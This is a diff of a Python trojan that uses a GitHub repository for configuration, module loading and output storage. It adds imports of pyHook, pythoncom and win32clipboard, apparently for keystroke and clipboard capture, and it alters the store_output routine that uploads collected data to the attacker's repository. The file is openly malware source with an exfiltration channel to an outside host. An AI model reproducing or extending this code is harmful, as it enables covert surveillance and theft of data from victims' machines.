@@ -11,6 +11,9 @@ import threading
 import random
 import sys
 import time
+import pythoncom
+import pyHook
+import win32clipboard
 
 #Define global variables
 gh_username = "aberlanga25"
@@ -26,7 +29,7 @@ trojan_id_default = base64.b64encode("default".encode()).decode("utf-8")
 trojan_config_file_path = f"Trojan/config/{trojan_id}.json"
 trojan_default_config_file_path = f"Trojan/config/{trojan_id_default}.json"
 trojan_module_folder_path = "Trojan/modules/"
-trojan_output_file_name = datetime.utcnow().isoformat() + "-" + trojan_id
+trojan_output_file_name = datetime.utcnow().isoformat()
 trojan_output_file_path = "Trojan/data/" + trojan_output_file_name
 trojan_output_file_contents = ""
 
@@ -123,9 +126,9 @@ def store_output():
     gh, repo, branch = gh_connect()
     sha = get_file_sha(trojan_output_file_path)
     if sha:
-        repo.contents(trojan_output_file_path).update(trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()))
+        repo.contents(trojan_output_file_path).update(trojan_output_file_name, trojan_output_file_contents.encode())
     else:
-        repo.create_file(trojan_output_file_path, trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()))
+        repo.create_file(trojan_output_file_path, trojan_output_file_name, trojan_output_file_contents.encode())
     return
 
 #Required to allow module import from github
